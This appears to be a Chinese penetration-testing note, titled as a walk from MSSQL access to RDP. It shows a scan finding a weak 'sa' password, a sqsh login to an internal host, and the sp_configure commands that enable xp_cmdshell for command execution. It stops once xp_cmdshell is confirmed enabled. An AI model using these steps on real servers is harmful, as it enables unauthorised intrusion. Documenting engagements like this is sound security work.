---
aliases:
cssclasses:
tags:
icon: pen-to-square
date: 2025-10-16
title: 从mssql到rdp远程桌面连接
category:
  - 项目
---
`fscan`扫描，爆出`mssql`弱密码`san:1`
使用sqsh连接mssql
```bash
sqsh -S 10.99.xx.xx -U sa -P 1
```
为了执行命令，首先查看最短最方便的路径`xp_cmdshell`命令执行
启动`xp_cmdshell`
```bash
1> EXEC sp_configure 'show advanced options', 1; 
2> RECONFIGURE; 
3> go 
Configuration option 'show advanced options' changed from 0 to 1. Run the RECONFIGURE statement to install. (return status = 0)
```
查询`xp_cmdshell`是否启用
```bash
1>EXEC sp_configure 'xp_cmdshell';
2>go

name
        ----------------------------------------------------------------------------------------------------------------
        xp_cmdshell

        minimum     maximum     config_value run_value
        ----------- ----------- ------------ -----------
                  0           1            1           1
```
